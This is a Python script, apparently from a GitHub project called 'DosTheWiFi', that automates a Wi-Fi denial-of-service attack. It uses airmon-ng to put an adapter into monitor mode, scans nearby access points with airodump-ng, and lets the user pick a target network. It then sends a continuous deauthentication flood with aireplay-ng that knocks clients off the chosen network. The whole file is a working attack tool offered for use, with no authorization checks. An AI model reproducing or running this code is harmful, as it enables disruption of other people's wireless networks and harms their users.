# This Tool Is Made By NandyDark.. It Is Licensed Under MIT License.. Skids Don't Copy It.. 
# Can Be Found At https://github.com/nandydark/DosTheWiFi

import os
import re
import subprocess
import shutil
import csv
import time
from datetime import datetime

available_networks = []

def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status

# The Banner...
print(r"""███╗   ██╗ █████╗ ███╗   ██╗██████╗ ██╗   ██╗██████╗  █████╗ ██████╗ ██╗  ██╗
████╗  ██║██╔══██╗████╗  ██║██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
██╔██╗ ██║███████║██╔██╗ ██║██║  ██║ ╚████╔╝ ██║  ██║███████║██████╔╝█████╔╝ 
██║╚██╗██║██╔══██║██║╚██╗██║██║  ██║  ╚██╔╝  ██║  ██║██╔══██║██╔══██╗██╔═██╗ 
██║ ╚████║██║  ██║██║ ╚████║██████╔╝   ██║   ██████╔╝██║  ██║██║  ██║██║  ██╗
╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝""")
print("\n................................................................")
print("\n. DoS The WiFi Tool, Made By NandyDark                         .")
print("\n. Don't Forget To Follow Me On Github                          .")
print("\n. https://www.github.com/nandydark                             .")
print("\n................................................................")

# Gimme Sudo Power....
if not 'SUDO_UID' in os.environ.keys():
    print("Please Run This Program Again With Sudo!!.")
    exit()

# Copy All .csv To The Backup Directory...
for file_name in os.listdir():
    if ".csv" in file_name:
        print("We Found .csv Files Already In The Directory.... Please Delete Them And Try Again!!")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Checked... Backup Folder Exists...Now Pushing .csv Files To Backup Directory!!!!")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("^wlan[0-9]+")

checkwifi_final = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# If NO Wifi Adapters Are Found...
if len(checkwifi_final) == 0:
    print("Please Connect A Wifi Controller And Try Again.")
    exit()

# For Choosing The Target Wifi Network...
print("The Following Wifi Targets Are Available:")
for index, item in enumerate(checkwifi_final):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input("Please Select Any One Target To Start Attacking: ")
    try:
        if checkwifi_final[int(wifi_interface_choice)]:
            break
    except:
        print("Please Enter A Valid Target!!.")

lakhacmybuddy = checkwifi_final[int(wifi_interface_choice)]

# Kill conflicting WiFi processses
print("Wifi Adapter Is Successfully Connected!\nNow Starting The Process!! :")
kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Converting Mode Into Monitored mode
print("Converting Wifi Adapter Mode Into Monitored Mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", lakhacmybuddy])

discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", checkwifi_final[0] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], available_networks):
                                available_networks.append(row)

        print("Scanning... Press Ctrl+C To Stop Scanning And Selecting Target To Attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(available_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady To Select The Target.")

while True:
    choice = input("Please select a choice from above: ")
    try:
        if available_networks[int(choice)]:
            break
    except:
        print("Please try again...")

jokerasshole = available_networks[int(choice)]["BSSID"]
evilclownthebish = available_networks[int(choice)]["channel"].strip()

subprocess.run(["airmon-ng", "start", lakhacmybuddy + "mon", evilclownthebish])

subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", jokerasshole, checkwifi_final[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

try:
    while True:
        print("Attack Has Been Started, Press ctrl-c To Stop It....")
except KeyboardInterrupt:
    print("Changing Monitor Mode Into Normal Mode Bcz Services Pisses Off")
    subprocess.run(["airmon-ng", "stop", lakhacmybuddy + "mon"])
    print("Successfully Exited... No Issues Found... Everything Is Back Normal!!")
